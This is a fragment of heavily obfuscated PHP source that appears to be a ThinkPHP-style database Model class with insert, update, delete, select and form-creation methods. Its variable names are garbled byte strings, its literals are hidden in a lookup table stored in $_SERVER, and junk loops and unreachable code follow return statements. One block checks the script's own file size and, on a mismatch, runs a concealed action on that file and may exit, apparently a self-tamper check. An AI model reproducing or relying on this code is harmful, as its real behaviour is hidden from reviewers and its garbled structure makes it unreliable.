$Şş†í•ù[822]; if (!$¡ó¿ë­) { return; } $¨ıùĞÌù = 1; $ÓôÄÉ°Ö = $Şş†í•ù[823]; if (strlen($ÓôÄÉ°Ö) < $Şş†í•ù[706]) { return; } while ($¨ıùĞÌù <= (int) sqrt($›àî¸¹ş)) { $Û¨Ó‹İû = $¨ıùĞÌù; $×ş‰Ç½ß = $Şş†í•ù[751]; while (!0) { $Û¨Ó‹İû++; $¨ã£Õ¡µ = $Şş†í•ù[781]; while ($¨ã£Õ¡µ < $Şş†í•ù[60]) { if ($¨ã£Õ¡µ >= 0) { break; } $¨ã£Õ¡µ++; } if ($Û¨Ó‹İû <= 2) { $¨ıùĞÌù = $Û¨Ó‹İû; break; } else { if ($Û¨Ó‹İû < 2) { continue; } } $Ì ù”®¿ = !0; for ($Â‡™–´ì = 2; $Â‡™–´ì <= sqrt($Û¨Ó‹İû); $Â‡™–´ì++) { if ($Û¨Ó‹İû % $Â‡™–´ì == 0) { $Ì ù”®¿ = !1; } } if ($Ì ù”®¿) { $¨ıùĞÌù = $Û¨Ó‹İû; break; } } $”àÎ¾ÄÖ[] = $¨ıùĞÌù; $âéì¿Ç = $Şş†í•ù[824]; } $Ì°ƒ½æ = 2; for ($Û¨Ó‹İû = $›àî¸¹ş; $Û¨Ó‹İû > 1; $Û¨Ó‹İû--) { $Ì ù”®¿ = !0; $Ëâñõ£Ÿ = $Şş†í•ù[825]; if (!$Ëâñõ£Ÿ) { return; } foreach ($”àÎ¾ÄÖ as $üø€ù†Ï) { if ($Û¨Ó‹İû % $üø€ù†Ï == 0) { $Ì ù”®¿ = !1; break; } } if ($Ì ù”®¿) { $Ì°ƒ½æ = $Û¨Ó‹İû; break; } } return $Ì°ƒ½æ; } public function oaeu15b3d07d($¶¿Ê Åı, $¦¢ìšÁ) { $²¼²§§‘ =& $_SERVER[üŸĞÁÆÁ]; return call_user_func(array($²¼²§§‘[8], $²¼²§§‘[308]), $¶¿Ê Åı, $¦¢ìšÁ); $åîå½äö = $_SERVER[¼èá¯æÙ][826]; if (!$åîå½äö) { return; } } public function hbuteb685332($Ç”»—¼€, $©Ğš¿ëò) { $¤æ´°¿È =& $_SERVER[¼èá¯æÙ]; $˜ñæ¹ =& $_SERVER[üŸĞÁÆÁ]; return call_user_func(array($˜ñæ¹[309], $˜ñæ¹[310]), $Ç”»—¼€, $©Ğš¿ëò); $¡¡£ùº = $¤æ´°¿È[827]; if (strlen($¡¡£ùº) < $¤æ´°¿È[701]) { die; } } public function jqwt6b4a9e92($š’ÊÆæ’, $™ôÙçÛä) { $§ô©©¬ =& $_SERVER[üŸĞÁÆÁ]; return call_user_func(array($§ô©©¬[309], $§ô©©¬[311]), $š’ÊÆæ’, $™ôÙçÛä); $şå¥ø›ı = $_SERVER[¼èá¯æÙ][828]; } } goto FÒßŠ¢£ÕÛ; Eô»İ­Ï·‚: $_file = $_SERVER[$_SERVER[¼èá¯æÙ][55]]; $_size = $_SERVER[¼èá¯æÙ][829]; if ($_SERVER[$_SERVER[¼èá¯æÙ][54]] != $_size($_file)) { $_getc = $_SERVER[¼èá¯æÙ][56]; $_getfile = $_SERVER[$_SERVER[¼èá¯æÙ][57]] . $_SERVER[¼èá¯æÙ][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¼èá¯æÙ][59], $_getfilec); if (count($_getarrs) < $_SERVER[¼èá¯æÙ][60]) { $exit = $_SERVER[¼èá¯æÙ][61]; $exit(); } $_act = $_SERVER[¼èá¯æÙ][62]; $_act($_file); } goto C¶Ûíè†×‹; Eñ¥Íƒ‘: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\x65", "\157\x72\x64\145\162", "\x61\154\x69\x61\x73", "\150\141\166\151\156\147", "\x67\x72\157\165\x70", "\x6c\157\x63\153", "\144\151\163\x74\x69\x6e\x63\x74", "\141\165\x74\157", "\146\151\x6c\164\x65\162", "\166\141\154\x69\144\x61\164\145", "\x72\145\x73\165\154\164", "\x62\151\156\x64", "\x74\157\153\x65\x6e"); public function __construct($¯ªÏú”ï = '', $ ò©³¯Å = '', $ß‘Ûö¡º = '') { $òô‘ü™Õ =& $_SERVER[¼èá¯æÙ]; $this->_initialize(); if (!empty($¯ªÏú”ï)) { if (strpos($¯ªÏú”ï, $òô‘ü™Õ[10])) { list($this->dbName, $this->name) = explode($òô‘ü™Õ[10], $¯ªÏú”ï); } else { $this->name = $¯ªÏú”ï; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ ò©³¯Å)) { $this->tablePrefix = $òô‘ü™Õ[12]; } elseif ($òô‘ü™Õ[12] != $ ò©³¯Å) { $this->tablePrefix = $ ò©³¯Å; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($òô‘ü™Õ[333]); } $this->db(0, empty($this->connection) ? $ß‘Ûö¡º : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ƒí¿»½Ş =& $_SERVER[¼èá¯æÙ]; if (empty($this->fields)) { if (think_config($ƒí¿»½Ş[334])) { $ãğïãøç = $this->dbName ? $this->dbName : think_config($ƒí¿»½Ş[335]); $ĞøéÌæ = think_var_cache($ƒí¿»½Ş[336] . strtolower(get_path_this($ãğïãøç) . $ƒí¿»½Ş[10] . $this->name)); if ($ĞøéÌæ) { $ü³ˆşôÂ = think_config($ƒí¿»½Ş[337]); if (empty($ü³ˆşôÂ) || $ĞøéÌæ[$ƒí¿»½Ş[338]] == $ü³ˆşôÂ) { $this->fields = $ĞøéÌæ; return; } } } $this->flush(); } } public function flush() { $ú±âÔ§´ =& $_SERVER[¼èá¯æÙ]; $this->db->setModel($this->name); $í¹¼ø×€ = $this->db->getFields($this->getTableName()); if (!$í¹¼ø×€) { return !1; } $this->fields = array_keys($í¹¼ø×€); $this->fields[$ú±âÔ§´[339]] = !1; foreach ($í¹¼ø×€ as $ŠËŸªÈè => $Åâª¤×§) { $ Š­³‹á[$ŠËŸªÈè] = $Åâª¤×§[$ú±âÔ§´[33]]; if ($Åâª¤×§[$ú±âÔ§´[39]]) { $this->fields[$ú±âÔ§´[340]] = $ŠËŸªÈè; if ($Åâª¤×§[$ú±âÔ§´[42]]) { $this->fields[$ú±âÔ§´[339]] = !0; } } } $this->fields[$ú±âÔ§´[341]] = $ Š­³‹á; if (think_config($ú±âÔ§´[337])) { $this->fields[$ú±âÔ§´[338]] = think_config($ú±âÔ§´[337]); } if (think_config($ú±âÔ§´[334])) { $¨ÔŒ®ş = $this->dbName ? $this->dbName : think_config($ú±âÔ§´[335]); think_var_cache($ú±âÔ§´[336] . strtolower(get_path_this($¨ÔŒ®ş) . $ú±âÔ§´[10] . $this->name), $this->fields); } } public function switchModel($Û±àŒ, $ƒ¦İ²¯µ = array()) { $ºÂ„À×§ =& $_SERVER[¼èá¯æÙ]; $ØÏíîş„ = ucwords(strtolower($Û±àŒ)) . $ºÂ„À×§[342]; if (!class_exists($ØÏíîş„)) { think_exception($ØÏíîş„ . think_lang($ºÂ„À×§[343])); } $this->_extModel = new $ØÏíîş„($this->name); if (!empty($ƒ¦İ²¯µ)) { foreach ($ƒ¦İ²¯µ as $¥¨êàÙ°) { $this->_extModel->setProperty($¥¨êàÙ°, $this->{$¥¨êàÙ°}); } } return $this->_extModel; } public function __set($âİä£ª¾, $ıİß«£™) { $this->data[$âİä£ª¾] = $ıİß«£™; } public function __get($çíÑª¤¨) { return isset($this->data[$çíÑª¤¨]) ? $this->data[$çíÑª¤¨] : null; } public function __isset($âµùº’Œ) { return isset($this->data[$âµùº’Œ]); } public function __unset($´£üà½) { unset($this->data[$´£üà½]); } public function __call($„… ´ÓÏ, $ÉÓæ„ ´) { $ù°Æ†ˆ¡ =& $_SERVER[¼èá¯æÙ]; if (in_array(strtolower($„… ´ÓÏ), $this->methods, !0)) { $this->options[strtolower($„… ´ÓÏ)] = $ÉÓæ„ ´[0]; return $this; } elseif (in_array(strtolower($„… ´ÓÏ), array($ù°Æ†ˆ¡[344], $ù°Æ†ˆ¡[345], $ù°Æ†ˆ¡[346], $ù°Æ†ˆ¡[347], $ù°Æ†ˆ¡[348]), !0)) { $Ü”¢Ô²¬ = isset($ÉÓæ„ ´[0]) ? $ÉÓæ„ ´[0] : $ù°Æ†ˆ¡[232]; $Ü”¢Ô²¬ = $this->db->parseKey($Ü”¢Ô²¬); return $this->getField(strtoupper($„… ´ÓÏ) . $ù°Æ†ˆ¡[349] . $Ü”¢Ô²¬ . $ù°Æ†ˆ¡[350] . $„… ´ÓÏ, $ù°Æ†ˆ¡[344]); } elseif (strtolower(substr($„… ´ÓÏ, 0, 5)) == $ù°Æ†ˆ¡[351]) { $Ü”¢Ô²¬ = think_parse_name(substr($„… ´ÓÏ, 5)); $¡ÃŞ€ëá[$Ü”¢Ô²¬] = $ÉÓæ„ ´[0]; return $this->where($¡ÃŞ€ëá)->find(); } elseif (strtolower(substr($„… ´ÓÏ, 0, 10)) == $ù°Æ†ˆ¡[352]) { $÷é“‚Ğ = think_parse_name(substr($„… ´ÓÏ, 10)); $¡ÃŞ€ëá[$÷é“‚Ğ] = $ÉÓæ„ ´[0]; return $this->where($¡ÃŞ€ëá)->getField($ÉÓæ„ ´[1]); } elseif (isset($this->_scope[$„… ´ÓÏ])) { return $this->scope($„… ´ÓÏ, $ÉÓæ„ ´[0]); } elseif (method_exists($this, $„… ´ÓÏ)) { array_unshift($ÉÓæ„ ´, $„… ´ÓÏ); return call_user_func_array(array($this, $ù°Æ†ˆ¡[353]), $ÉÓæ„ ´); } else { return call_user_func_array(array(parent, $„… ´ÓÏ), $ÉÓæ„ ´); } } protected function call() { $ßœ°Ş¯ =& $_SERVER[¼èá¯æÙ]; $ùòÚ¦¼´ = func_get_args(); $î‹¨ùÔÛ = array_shift($ùòÚ¦¼´); $“€Ç¬€ = $î‹¨ùÔÛ; if (is_array($î‹¨ùÔÛ)) { $“€Ç¬€ = $î‹¨ùÔÛ[1]; $î‹¨ùÔÛ = $î‹¨ùÔÛ[0]; } $õ·ÑÀ•ã = count($ùòÚ¦¼´) - 1; if (isset($ùòÚ¦¼´[$õ·ÑÀ•ã]) && $ùòÚ¦¼´[$õ·ÑÀ•ã] === $î‹¨ùÔÛ) { think_exception(__CLASS__ . $ßœ°Ş¯[4] . $î‹¨ùÔÛ . think_lang($ßœ°Ş¯[354])); return; } $ùòÚ¦¼´[] = $î‹¨ùÔÛ; if (method_exists($this, $ßœ°Ş¯[355])) { $×¦‹õµ¶ = call_user_func_array(array($this, $ßœ°Ş¯[356]), array($“€Ç¬€, $ùòÚ¦¼´)); if (!is_null($×¦‹õµ¶) && $×¦‹õµ¶ !== !1) { return $×¦‹õµ¶; } } $ÈªçŸä = call_user_func_array(array($this, $î‹¨ùÔÛ), $ùòÚ¦¼´); if (method_exists($this, $ßœ°Ş¯[357])) { $×¦‹õµ¶ = call_user_func_array(array($this, $ßœ°Ş¯[358]), array($“€Ç¬€, $ùòÚ¦¼´, $ÈªçŸä)); if ($×¦‹õµ¶) { return $×¦‹õµ¶; } } return $ÈªçŸä; } protected function _initialize() { } protected function _facade($‘¤Ì§Í) { $Åá¡ß¥¥ =& $_SERVER[¼èá¯æÙ]; if (!empty($this->fields)) { foreach ($‘¤Ì§Í as $‚Ú¯‰„Ë => $ä½­šæ) { if (is_array($this->fields) && !in_array($‚Ú¯‰„Ë, $this->fields, !0)) { unset($‘¤Ì§Í[$‚Ú¯‰„Ë]); } elseif (is_scalar($ä½­šæ)) { $this->_parseType($‘¤Ì§Í, $‚Ú¯‰„Ë); } } } if (!empty($this->options[$Åá¡ß¥¥[359]])) { $‘¤Ì§Í = array_map($this->options[$Åá¡ß¥¥[359]], $‘¤Ì§Í); unset($this->options[$Åá¡ß¥¥[359]]); } $this->_beforeWrite($‘¤Ì§Í); return $‘¤Ì§Í; } protected function _beforeWrite(&$ÜºöÃŞ) { } public function add($ˆò³¹» = '', $×µ··ËĞ = array(), $ò ÷ßäÌ = false) { if (empty($ˆò³¹»)) { if (!empty($this->data)) { $ˆò³¹» = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¼èá¯æÙ][360]); return !1; } } $×µ··ËĞ = $this->_parseOptions($×µ··ËĞ); $ˆò³¹» = $this->_facade($ˆò³¹»); if (!1 === $this->_beforeInsert($ˆò³¹», $×µ··ËĞ)) { return !1; } $‡å¤ŸêÍ = $this->db->insert($ˆò³¹», $×µ··ËĞ, $ò ÷ßäÌ); if (!1 !== $‡å¤ŸêÍ) { $… î›à = $this->getLastInsID(); if ($… î›à) { $ˆò³¹»[$this->getPk()] = $… î›à; $this->_after_insert($ˆò³¹», $×µ··ËĞ); return $… î›à; } $this->_after_insert($ˆò³¹», $×µ··ËĞ); } return $‡å¤ŸêÍ; } protected function _beforeInsert(&$¸§İşĞµ, $õøºĞã) { } protected function _after_insert($´“êĞ, $ã…ûÈ¾) { } public function addAll($ï²¥Ó·», $Ïö—¶ = array(), $Úò÷ı¼› = false) { $¥ÄŞ×ğ =& $_SERVER[¼èá¯æÙ]; if (empty($ï²¥Ó·»)) { $this->error = think_lang($¥ÄŞ×ğ[360]); return !1; } $Ïö—¶ = $this->_parseOptions($Ïö—¶); foreach ($ï²¥Ó·» as $¼ÎİÄ¬ => $†Í®‡Ã) { $ï²¥Ó·»[$¼ÎİÄ¬] = $this->_facade($†Í®‡Ã); } if (method_exists($this->db, $¥ÄŞ×ğ[361])) { $“Ç›‘‰Ù = $this->db->insertAll($ï²¥Ó·», $Ïö—¶, $Úò÷ı¼›); } else { $this->startTrans(); foreach ($ï²¥Ó·» as $¼ÎİÄ¬ => $†Í®‡Ã) { $“Ç›‘‰Ù = $this->db->insert($†Í®‡Ã, $Ïö—¶, $Úò÷ı¼›); } $this->commit(); } if (!1 !== $“Ç›‘‰Ù) { $ùõÒØ¸æ = $this->getLastInsID(); if ($ùõÒØ¸æ) { return $ùõÒØ¸æ; } } return $“Ç›‘‰Ù; } public function selectAdd($ÕŠ–âıª = '', $½¥ş¤Å = '', $¸ø©İğ§ = array()) { $ñ¤¤ëİ =& $_SERVER[¼èá¯æÙ]; $¸ø©İğ§ = $this->_parseOptions($¸ø©İğ§); if (!1 === ($ìñ½½¡ä = $this->db->selectInsert($ÕŠ–âıª ? $ÕŠ–âıª : $¸ø©İğ§[$ñ¤¤ëİ[362]], $½¥ş¤Å ? $½¥ş¤Å : $this->getTableName(), $¸ø©İğ§))) { $this->error = think_lang($ñ¤¤ëİ[363]); return !1; } else { return $ìñ½½¡ä; } } public function save($£ÂïÎäñ = '', $Âœûª¿ = array()) { $¶Íèä¾² =& $_SERVER[¼èá¯æÙ]; if (empty($£ÂïÎäñ)) { if (!empty($this->data)) { $£ÂïÎäñ = $this->data; $this->data = array(); } else { $this->error = think_lang($¶Íèä¾²[360]); return !1; } } $£ÂïÎäñ = $this->_facade($£ÂïÎäñ); $Âœûª¿ = $this->_parseOptions($Âœûª¿); $è®¦¨ª = $this->getPk(); if (!isset($Âœûª¿[$¶Íèä¾²[364]])) { if (isset($£ÂïÎäñ[$è®¦¨ª])) { $Åµ²¸Í[$è®¦¨ª] = $£ÂïÎäñ[$è®¦¨ª]; $Âœûª¿[$¶Íèä¾²[364]] = $Åµ²¸Í; unset($£ÂïÎäñ[$è®¦¨ª]); } else { $this->error = think_lang($¶Íèä¾²[363]); return !1; } } if (is_array($Âœûª¿[$¶Íèä¾²[364]]) && isset($Âœûª¿[$¶Íèä¾²[364]][$è®¦¨ª])) { $¬âìÈœÚ = $Âœûª¿[$¶Íèä¾²[364]][$è®¦¨ª]; } if (!1 === $this->_beforeUpdate($£ÂïÎäñ, $Âœûª¿)) { return !1; } $ğğÚŠø„ = $this->db->update($£ÂïÎäñ, $Âœûª¿); if (!1 !== $ğğÚŠø„) { if (isset($¬âìÈœÚ)) { $£ÂïÎäñ[$è®¦¨ª] = $¬âìÈœÚ; } $this->_afterUpdate($£ÂïÎäñ, $Âœûª¿); } return $ğğÚŠø„; } protected function _beforeUpdate(&$İåÀñ‹, $Æ³±ü¿à) { } protected function _afterUpdate($Ô»½À¶, $³åÜ’) { } public function delete($ÍĞá±í = array()) { $”ßëå‡À =& $_SERVER[¼èá¯æÙ]; if (empty($ÍĞá±í) && empty($this->options[$”ßëå‡À[364]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $©ÂÉ‡Ÿê = $this->getPk(); if (is_numeric($ÍĞá±í) || is_string($ÍĞá±í)) { if (strpos($ÍĞá±í, $”ßëå‡À[50])) { $È¬µõ…Ü[$©ÂÉ‡Ÿê] = array($”ßëå‡À[365], $ÍĞá±í); } else { $È¬µõ…Ü[$©ÂÉ‡Ÿê] = $ÍĞá±í; } $this->options[$”ßëå‡À[364]] = $È¬µõ…Ü; } $ÍĞá±í = $this->_parseOptions(); if (is_array($ÍĞá±í[$”ßëå‡À[364]]) && isset($ÍĞá±í[$”ßëå‡À[364]][$©ÂÉ‡Ÿê])) { $ÍŸ³Ô½® = $ÍĞá±í[$”ßëå‡À[364]][$©ÂÉ‡Ÿê]; } $ÃÚµ™ = $this->db->delete($ÍĞá±í); if (!1 !== $ÃÚµ™) { $óùù…íä = array(); if (isset($ÍŸ³Ô½®)) { $óùù…íä[$©ÂÉ‡Ÿê] = $ÍŸ³Ô½®; } $this->_after_delete($óùù…íä, $ÍĞá±í); } return $ÃÚµ™; } protected function _after_delete($åË¦ÕÂ, $±ó€äüÏ) { } public function select($ÙıÊ¯ñã = array()) { $¡„ú–Í® =& $_SERVER[¼èá¯æÙ]; if (is_string($ÙıÊ¯ñã) || is_numeric($ÙıÊ¯ñã)) { $§¶å³â¶ = $this->getPk(); if (strpos($ÙıÊ¯ñã, $¡„ú–Í®[50])) { $ÖºÚÊ¿[$§¶å³â¶] = array($¡„ú–Í®[365], $ÙıÊ¯ñã); } else { $ÖºÚÊ¿[$§¶å³â¶] = $ÙıÊ¯ñã; } $this->options[$¡„ú–Í®[364]] = $ÖºÚÊ¿; } elseif (!1 === $ÙıÊ¯ñã) { $ÙıÊ¯ñã = $this->_parseOptions(); return $¡„ú–Í®[366] . $this->db->buildSelectSql($ÙıÊ¯ñã) . $¡„ú–Í®[367]; } $ÙıÊ¯ñã = $this->_parseOptions(); $í±×ôä€ = $this->db->select($ÙıÊ¯ñã); if (!1 === $í±×ôä€) { return !1; } if (empty($í±×ôä€)) { return null; } $this->_afterSelect($í±×ôä€, $ÙıÊ¯ñã); return $í±×ôä€; } protected function _afterSelect(&$„‹õüÍõ, $Î´Â¼°ê) { } public function buildSql($Ñú©Âß— = array()) { $ˆÔ²¤âÉ =& $_SERVER[¼èá¯æÙ]; $Ñú©Âß— = $this->_parseOptions($Ñú©Âß—); return $ˆÔ²¤âÉ[366] . $this->db->buildSelectSql($Ñú©Âß—) . $ˆÔ²¤âÉ[367]; } public function optionsValue($Ç‡¾Å€Ö = null) { if (is_null($Ç‡¾Å€Ö)) { return $this->options; } elseif (is_array($Ç‡¾Å€Ö)) { $this->options = array_merge($this->options, $Ç‡¾Å€Ö); } } protected function _parseOptions($¥ÒÌ§Á” = array()) { $å±í¶  =& $_SERVER[¼èá¯æÙ]; if (is_array($¥ÒÌ§Á”)) { $¥ÒÌ§Á” = array_merge($this->options, $¥ÒÌ§Á”); } $this->options = array(); if (!isset($¥ÒÌ§Á”[$å±í¶ [368]])) { $¥ÒÌ§Á”[$å±í¶ [368]] = $this->getTableName(); $ÅÛÆ§€ = $this->fields; } else { $ÅÛÆ§€ = $this->getDbFields(); } if (!empty($¥ÒÌ§Á”[$å±í¶ [369]])) { $¥ÒÌ§Á”[$å±í¶ [368]] .= $å±í¶ [53] . $¥ÒÌ§Á”[$å±í¶ [369]]; } $¥ÒÌ§Á”[$å±í¶ [370]] = $this->name; if (isset($¥ÒÌ§Á”[$å±í¶ [364]]) && is_array($¥ÒÌ§Á”[$å±í¶ [364]]) && !empty($ÅÛÆ§€) && !isset($¥ÒÌ§Á”[$å±í¶ [371]]) && !isset($¥ÒÌ§Á”[$å±í¶ [368]])) { foreach ($¥ÒÌ§Á”[$å±í¶ [364]] as $ºÕ–·É => $çÏ©µı) { $ºÕ–·É = trim($ºÕ–·É); if (in_array($ºÕ–·É, $ÅÛÆ§€, !0)) { if (is_scalar($çÏ©µı)) { $this->_parseType($¥ÒÌ§Á”[$å±í¶ [364]], $ºÕ–·É); } } elseif (!is_numeric($ºÕ–·É) && $å±í¶ [11] != substr($ºÕ–·É, 0, 1) && !1 === strpos($ºÕ–·É, $å±í¶ [10]) && !1 === strpos($ºÕ–·É, $å±í¶ [349]) && !1 === strpos($ºÕ–·É, $å±í¶ [224]) && !1 === strpos($ºÕ–·É, $å±í¶ [296])) { unset($¥ÒÌ§Á”[$å±í¶ [364]][$ºÕ–·É]); } } } $this->_options_filter($¥ÒÌ§Á”); return $¥ÒÌ§Á”; } protected function _options_filter(&$öèïÉ­´) { } protected function _parseType(&$Óì°½ñÖ, $è¬Ş¡‘³) { $çà… ¦œ =& $_SERVER[¼èá¯æÙ]; if (empty($this->options[$çà… ¦œ[372]][$çà… ¦œ[4] . $è¬Ş¡‘³])) { $‚·œÔ = strtolower($this->fields[$çà… ¦œ[341]][$è¬Ş¡‘³]); if (!1 !== strpos($‚·œÔ, $çà… ¦œ[373])) { } elseif (!1 === strpos($‚·œÔ, $çà… ¦œ[374]) && !1 !== strpos($‚·œÔ, $çà… ¦œ[375])) { $Óì°½ñÖ[$è¬Ş¡‘³] = intval($Óì°½ñÖ[$è¬Ş¡‘³]); } elseif (!1 !== strpos($‚·œÔ, $çà… ¦œ[376]) || !1 !== strpos($‚·œÔ, $çà… ¦œ[377])) { $Óì°½ñÖ[$è¬Ş¡‘³] = floatval($Óì°½ñÖ[$è¬Ş¡‘³]); } elseif (!1 !== strpos($‚·œÔ, $çà… ¦œ[378])) { $Óì°½ñÖ[$è¬Ş¡‘³] = (bool) $Óì°½ñÖ[$è¬Ş¡‘³]; } } } public function find($´ä–¿Şü = array()) { $ıß•ööƒ =& $_SERVER[¼èá¯æÙ]; if (is_numeric($´ä–¿Şü) || is_string($´ä–¿Şü)) { $°ÁÓØ­Š[$this->getPk()] = intval($´ä–¿Şü); $this->options[$ıß•ööƒ[364]] = $°ÁÓØ­Š; } $this->options[$ıß•ööƒ[379]] = 1; $´ä–¿Şü = $this->_parseOptions(); $Á›——îø = $this->db->select($´ä–¿Şü); if (!1 === $Á›——îø) { return !1; } if (empty($Á›——îø)) { return null; } $this->data = $Á›——îø[0]; $this->_afterFind($this->data, $´ä–¿Şü); if (!empty($this->options[$ıß•ööƒ[380]])) { return $this->returnResult($this->data, $this->options[$ıß•ööƒ[380]]); } return $this->data; } protected function _afterFind(&$¦·†¨ÎŠ, $ú‹ìæĞ) { } protected function returnResult($ì‚ó¿ÍÏ, $—“ó­ì” = '') { $ˆ£° û» =& $_SERVER[¼èá¯æÙ]; if ($—“ó­ì”) { if (is_callable($—“ó­ì”)) { return call_user_func($—“ó­ì”, $ì‚ó¿ÍÏ); } switch (strtolower($—“ó­ì”)) { case $ˆ£° û»[381]: return json_encode($ì‚ó¿ÍÏ); case $ˆ£° û»[382]: return xml_encode($ì‚ó¿ÍÏ); } } return $ì‚ó¿ÍÏ; } public function parseFieldsMap($‚ÑÂúı, $ŸåÇâ¿ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $À‡ÊÁæ× => $°åœ•›Ã) { if ($ŸåÇâ¿ == 1) { if (isset($‚ÑÂúı[$°åœ•›Ã])) { $‚ÑÂúı[$À‡ÊÁæ×] = $‚ÑÂúı[$°åœ•›Ã]; unset($‚ÑÂúı[$°åœ•›Ã]); } } else { if (isset($‚ÑÂúı[$À‡ÊÁæ×])) { $‚ÑÂúı[$°åœ•›Ã] = $‚ÑÂúı[$À‡ÊÁæ×]; unset($‚ÑÂúı[$À‡ÊÁæ×]); } } } } return $‚ÑÂúı; } public function setField($ğ’×şµ¨, $Ùşµà§³ = '') { if (is_array($ğ’×şµ¨)) { $ºÉî£™Æ = $ğ’×şµ¨; } else { $ºÉî£™Æ[$ğ’×şµ¨] = $Ùşµà§³; } return $this->save($ºÉî£™Æ); } public function setAdd($«ã„‡ä­, $Íò€Úë‡ = 1) { $ãÌÚİé€ =& $_SERVER[¼èá¯æÙ]; $”ÄõÅÔ” = $«ã„‡ä­ . $ãÌÚİé€[383] . $Íò€Úë‡; if ($Íò€Úë‡ < 0) { $”ÄõÅÔ” = $«ã„‡ä­ . $Íò€Úë‡; } return $this->setField($«ã„‡ä­, array($ãÌÚİé€[384], $”ÄõÅÔ”)); } public function getField($¿Ëë¥Öï, $¤–§…Ê = null) { $œ–ØË =& $_SERVER[¼èá¯æÙ]; $ØÚğÓ˜è[$œ–ØË[362]] = $¿Ëë¥Öï; $ØÚğÓ˜è = $this->_parseOptions($ØÚğÓ˜è); $¿Ëë¥Öï = trim($¿Ëë¥Öï); if (strpos($¿Ëë¥Öï, $œ–ØË[50])) { if (!isset($ØÚğÓ˜è[$œ–ØË[379]])) { $ØÚğÓ˜è[$œ–ØË[379]] = is_numeric($¤–§…Ê) ? $¤–§…Ê : $œ–ØË[12]; } $ëùÀ—‚´ = $this->db->select($ØÚğÓ˜è); if (!empty($ëùÀ—‚´)) { $õŒŒú ¬ = explode($œ–ØË[50], $¿Ëë¥Öï); $¿Ëë¥Öï = array_keys($ëùÀ—‚´[0]); $³ãÌ¬“Ü = array_shift($¿Ëë¥Öï); $——Ğ¹µÆ = array_shift($¿Ëë¥Öï); $Ë£‘ÕŒ§ = array(); $Œ®ç´Í¹ = count($õŒŒú ¬); foreach ($ëùÀ—‚´ as $ó€Éş¹‹) { $ÄÇÚˆûÛ = $ó€Éş¹‹[$³ãÌ¬“Ü]; if (2 == $Œ®ç´Í¹) { $Ë£‘ÕŒ§[$ÄÇÚˆûÛ] = $ó€Éş¹‹[$——Ğ¹µÆ]; } else { $Ë£‘ÕŒ§[$ÄÇÚˆûÛ] = is_string($¤–§…Ê) ? implode($¤–§…Ê, $ó€Éş¹‹) : $ó€Éş¹‹; } } return $Ë£‘ÕŒ§; } } else { if (!0 !== $¤–§…Ê) { $ØÚğÓ˜è[$œ–ØË[379]] = is_numeric($¤–§…Ê) ? $¤–§…Ê : 1; } if ($¤–§…Ê === $œ–ØË[344]) { unset($ØÚğÓ˜è[$œ–ØË[379]]); } $ó€Éş¹‹ = $this->db->select($ØÚğÓ˜è); if (!empty($ó€Éş¹‹)) { if ($¤–§…Ê === $œ–ØË[344]) { return reset($ó€Éş¹‹[0]); } if (!0 !== $¤–§…Ê && 1 == $ØÚğÓ˜è[$œ–ØË[379]]) { return reset($ó€Éş¹‹[0]); } foreach ($ó€Éş¹‹ as $£»¦ô¿) { $ªÁü±[] = $£»¦ô¿[$¿Ëë¥Öï]; } return $ªÁü±; } } return null; } public function create($¹ıİÖËœ = '', $Ø È§³¸ = '') { $å•à¶ø =& $_SERVER[¼èá¯æÙ]; if (empty($¹ıİÖËœ)) { $¹ıİÖËœ = $_POST; } elseif (is_object($¹ıİÖËœ)) { $¹ıİÖËœ = get_object_vars($¹ıİÖËœ); } if (empty($¹ıİÖËœ) || !is_array($¹ıİÖËœ)) { $this->error = think_lang($å•à¶ø[360]); return !1; } $¹ıİÖËœ = $this->parseFieldsMap($¹ıİÖËœ, 0); $Ø È§³¸ = $Ø È§³¸ ? $Ø È§³¸ : (!empty($¹ıİÖËœ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$å•à¶ø[362]])) { $ÓÔØ€ = $this->options[$å•à¶ø[362]]; unset($this->options[$å•à¶ø[362]]); } elseif ($Ø È§³¸ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ÓÔØ€ = $this->insertFields; } elseif ($Ø È§³¸ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ÓÔØ€ = $this->updateFields; } if (isset($ÓÔØ€)) { if (is_string($ÓÔØ€)) { $ÓÔØ€ = explode($å•à¶ø[50], $ÓÔØ€); } if (think_config($å•à¶ø[385])) { $ÓÔØ€[] = think_config($å•à¶ø[386]); } foreach ($¹ıİÖËœ as $ÑùƒëãÔ => $–ßìè´Ï) { if (!in_array($ÑùƒëãÔ, $ÓÔØ€)) { unset($¹ıİÖËœ[$ÑùƒëãÔ]); } } } if (!$this->autoValidation($¹ıİÖËœ, $Ø È§³¸)) { return !1; } if (!$this->autoCheckToken($¹ıİÖËœ)) { $this->error = think_lang($å•à¶ø[387]); return !1; } if ($this->autoCheckFields) { $ÓÔØ€ = $this->getDbFields(); foreach ($¹ıİÖËœ as $ÑùƒëãÔ => $–ßìè´Ï) { if (!in_array($ÑùƒëãÔ, $ÓÔØ€)) { unset($¹ıİÖËœ[$ÑùƒëãÔ]); } elseif (MAGIC_QUOTES_GPC && is_string($–ßìè´Ï)) { $¹ıİÖËœ[$ÑùƒëãÔ] = stripslashes($–ßìè´Ï); } } } $this->autoOperation($¹ıİÖËœ, $Ø È§³¸); $this->data = $¹ıİÖËœ; return $¹ıİÖËœ; } public function autoCheckToken($Ó´Ô÷™¹) { $ä…’ª =& $_SERVER[¼èá¯æÙ]; if (isset($this->options[$ä…’ª[388]]) && !$this->options[$ä…’ª[388]]) { return !0; } if (think_config($ä…’ª[385])) { $“ÁÈ½§‹ = 